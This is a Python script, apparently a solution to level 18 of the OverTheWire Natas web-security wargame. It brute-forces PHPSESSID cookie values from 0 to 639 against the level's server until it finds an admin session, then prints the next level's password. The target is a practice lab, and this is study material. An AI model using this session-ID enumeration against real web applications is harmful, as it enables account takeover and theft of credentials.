import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

fail_string = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."

def inject_payload(pid):
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '18'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas18', passw.strip())
    payload = {'PHPSESSID':pid}
    r = requests.post('http://natas18.natas.labs.overthewire.org/', auth=auth, data={'username':'admin','password':'pass'}, cookies=payload)
    passreg = '[a-zA-Z0-9]{32}'
    if fail_string not in r.text:
        print(re.findall(passreg, r.text)[1])
        return True
    return False

if __name__ == "__main__":
    for i in range(0,640):
        if inject_payload(str(i)):
            break

